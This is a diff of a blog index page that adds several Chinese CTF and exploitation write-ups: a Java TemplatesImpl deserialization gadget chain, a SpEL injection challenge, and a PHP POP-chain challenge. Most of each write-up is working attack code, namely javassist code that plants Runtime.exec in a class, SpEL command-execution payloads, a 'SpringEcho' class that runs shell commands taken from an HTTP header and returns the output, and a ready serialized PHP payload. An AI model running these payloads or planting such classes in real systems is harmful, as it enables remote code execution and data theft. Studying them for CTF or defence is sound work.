@@ -112,6 +112,149 @@ var _hmt = _hmt || [];
 
   
     
+    <h3 class="article-title"><a href="/2025/03/29/TemplatesImpl类中的调用链/"><span>TemplatesImpl类中的调用链</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/03/29/TemplatesImpl类中的调用链/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-03-29T08:13:42.000Z">
+          2025-03-29
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子</span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">        TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">            TemplatesImpl#defineTransletClasses()-&gt;</span><br><span class="line">                TransletClassLoader#defineClass()-&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>ClassLoader，类加载器，是JVM执行类加载机制的前提，其主要任务为根据一个类的全限定名来读取此类的二进制字节流到JVM内部，然后转换为一个与目标类对应的java.lang.Class对象实例。</p>
+<h2 id="defineClass加载器"><a href="#defineClass加载器" class="headerlink" title="defineClass加载器"></a>defineClass加载器</h2><p>对于我们利用漏洞简单的来说，就是ClassLoader中的defineClass加载器能过获取我们给他的字节码从而读取成类，在这个过程中若这个字节码对应的类中存放有恶意内容就可以触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass cc = pool.makeClass(&quot;Test&quot;);//创造类</span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));//设置父类</span><br><span class="line">CtConstructor constructor = cc.makeClassInitializer();//创造空的构造函数</span><br><span class="line">constructor.insertBefore(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);//插入静态代码块</span><br><span class="line">byte[] bytes=cc.toBytecode();//转换成字节码</span><br><span class="line"></span><br><span class="line">这里用javassist类创造一个带有static代码块运行后会触发计算器的恶意类(Javaassist 就是一个用来 处理 Java 字节码的</span><br><span class="line">类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已</span><br><span class="line">有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生</span><br><span class="line">成一个新的类对象，通过完全手动的方式。)</span><br></pre></td></tr></table></figure>
+
+<h2 id="触发链过程"><a href="#触发链过程" class="headerlink" title="触发链过程"></a>触发链过程</h2><p>我们最终的目标是要触发defineClass加载器<br><img src="/../img/TemplatesImpl/defineclass.png" alt="defineclass"><br>但是classloader类中他是protected型，我们需要找到能调用他的方法，我们寻找所有使用defineclass方法的地方<br><img src="/../img/TemplatesImpl/defineclass2.png" alt="defineclass"><br>在TemplatesImpl中的内置类TransletClassLoader(CLassLoader的子类)中找到，继续寻找调用它defineclass方法的地方</p>
+<p><img src="/../img/TemplatesImpl/defineclass3.png" alt="defineclass"><br>在这个类的defineTransletClasses中调用了他，继续找谁调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass4.png" alt="defineclass"><br>getTransletInstance方法调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass5.png" alt="defineclass"><br>但是注意_class值不能为null</p>
+<p>最后便是newTransformer调用了getTransletInstance<br><img src="/../img/TemplatesImpl/defineclass6.png" alt="defineclass"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj=new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);//恶意类字节码</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);//该值任意</span><br><span class="line">setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());//必须为TransformerFactoryImpl实例</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>
+<p>那么触发链就清晰了，注意为了顺利到达触发点,这三个值不能为null(“_bytecodes”,”_name”,”_tfactory”)并且恶意类父类需为AbstractTranslet</p>
+<p>这里的如何触发newTransformer()在CC链中再讲</p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2025/03/29/TemplatesImpl类中的调用链/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
+    <h3 class="article-title"><a href="/2025/03/29/Polar-JAVA题WP/"><span>Polar_JAVA题WP</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/03/29/Polar-JAVA题WP/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-03-29T05:53:45.000Z">
+          2025-03-29
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="Polar-EzJava"><a href="#Polar-EzJava" class="headerlink" title="[Polar]EzJava"></a>[Polar]EzJava</h2><p style="font-size:10px;color:#7f8c93">题目来源：Polar<br>
+题目类型：WEB<br>
+设计考点：Spel任意命令执行</p>
+
+<h3 id="认识SpEL"><a href="#认识SpEL" class="headerlink" title="认识SpEL"></a>认识SpEL</h3><p style="font-size:13px">Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。
+Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p>
+
+<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h4><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p>
+<h5 id="示例1-不注册新变量的用法"><a href="#示例1-不注册新变量的用法" class="headerlink" title="示例1:不注册新变量的用法"></a>示例1:不注册新变量的用法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;);//解析表达式</span><br><span class="line">System.out.println( exp.getValue() );//取值，Hello World！</span><br></pre></td></tr></table></figure>
+
+<h5 id="示例2-自定义注册加载变量的用法"><a href="#示例2-自定义注册加载变量的用法" class="headerlink" title="示例2:自定义注册加载变量的用法"></a>示例2:自定义注册加载变量的用法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Spel &#123;</span><br><span class="line">    public String name = &quot;何止&quot;;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Spel user = new Spel();</span><br><span class="line">        StandardEvaluationContext context=new StandardEvaluationContext();</span><br><span class="line">        context.setVariable(&quot;user&quot;,user);//通过StandardEvaluationContext注册自定义变量</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">        Expression expression = parser.parseExpression(&quot;#user.name&quot;);//解析表达式</span><br><span class="line">        System.out.println( expression.getValue(context).toString() );//取值,输出何止</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会用到的语法</p>
+<p>spel语法中的T()操作符 , T()操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法T(全限定类名).方法名()，后面会用得到</p>
+<p>spel中的#操作符可以用于标记对象</p>
+<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package BOOT-INF.classes.com.example.demo.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.expression.EvaluationContext;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span><br><span class="line">public class spel &#123;</span><br><span class="line">  @RequestMapping(&#123;&quot;/vul&quot;&#125;)</span><br><span class="line">  public String spelVul(String ex) &#123;</span><br><span class="line">    SpelExpressionParser spelExpressionParser = new SpelExpressionParser();</span><br><span class="line">    StandardEvaluationContext standardEvaluationContext = new StandardEvaluationContext();</span><br><span class="line">    String result = spelExpressionParser.parseExpression(ex).getValue((EvaluationContext)standardEvaluationContext).toString();</span><br><span class="line">    System.out.println(result);</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到网页的Controller层,在&#x2F;SPEL&#x2F;vul路径下接受一个ex字符串，然后用Spel对他进行解析，这里不存在任何过滤，可以直接使用SPel的任意文件执行。</p>
+<p>首先我们构造java题常见的payload (ProcessBuilder)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String[] str = new String[]&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;</span><br><span class="line">ProcessBuilder p = new ProcessBuilder( str );</span><br><span class="line">p.start();//打开计算器</span><br><span class="line">Spel也可以使用new的方法将多行代码汇聚成一行</span><br><span class="line"></span><br><span class="line">new ProcessBuilder(new String[]&#123;&quot;calc&quot;&#125;).start()</span><br></pre></td></tr></table></figure>
+<p>若需要Shell反弹则使用Runtime类，但是在Runtime类的实例需要他的静态方法getRuntime来获取，所以在Spel我们需要T()来获取Runtime类的Object</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">T(java.lang.Runtime)的作用就是 Runtime rt=Runtime.getRuntime()中的rt;</span><br></pre></td></tr></table></figure>
+<p>本题中直接将获取到的ex值传入Spel,所以我们只需要把payload传给ex即可</p>
+<p><img src="/../img/Polar/EzJava1.png" alt="web1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new java.io.BufferedReader(new java.io.InputStreamReader</span><br><span class="line">(new ProcessBuilder(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;cat /app/flag.txt&quot;&#125;).start().getInputStream(), &quot;gbk&quot;)).readLine()</span><br></pre></td></tr></table></figure>
+<h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class SpringEcho extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();</span><br><span class="line">        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();</span><br><span class="line">        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();</span><br><span class="line">        String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;)? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, httprequest.getHeader(&quot;C&quot;)&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, httprequest.getHeader(&quot;C&quot;)&#125;;</span><br><span class="line">        byte[] result = new byte[0];</span><br><span class="line">        try &#123;</span><br><span class="line">            result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next().getBytes();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().write(new String(result));</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().flush();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().close();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2025/03/29/Polar-JAVA题WP/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
     <h3 class="article-title"><a href="/2025/03/15/[harekazectf2019]easyNotes/"><span>Notes</span></a></h3>
     
   
@@ -534,6 +677,85 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
 
   
     
+    <h3 class="article-title"><a href="/2024/08/04/2022-popchains/"><span>2022:popchains</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2024/08/04/2022-popchains/" rel="bookmark">
+        <time class="entry-date published" datetime="2024-08-04T06:25:07.000Z">
+          2024-08-04
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>
+题目类型：WEB<br>
+设计考点：POP链，PHP反序列化</p>
+
+<h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p>
+
+<hr>
+<ol>
+<li><p>首先寻找终点</p>
+<p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p>
+<p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li>
+<li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p>
+<p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p>
+</li>
+<li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = new Make_a_Change();</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p>
+</li>
+</ol>
+<h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeup() -&gt; Road_is_Long::__toString() -&gt; Make_a_Change::__get() -&gt; Try_Work_Hard::__invoke() -&gt; Try_Work_Hard::append()</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = new Try_Work_Hard();</span><br><span class="line">$m = new Make_a_Change();</span><br><span class="line">$m-&gt;effort = $f;</span><br><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = $m;</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>GET</strong>传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2024/08/04/2022-popchains/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
     <h3 class="article-title"><a href="/2024/08/04/Hectf2024/"><span>HECTF2024</span></a></h3>
     
   
@@ -628,85 +850,6 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
 
   
     
-    <h3 class="article-title"><a href="/2024/08/04/2022-popchains/"><span>2022:popchains</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/08/04/2022-popchains/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-08-04T06:25:07.000Z">
-          2024-08-04
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          <h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>
-题目类型：WEB<br>
-设计考点：POP链，PHP反序列化</p>
-
-<h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 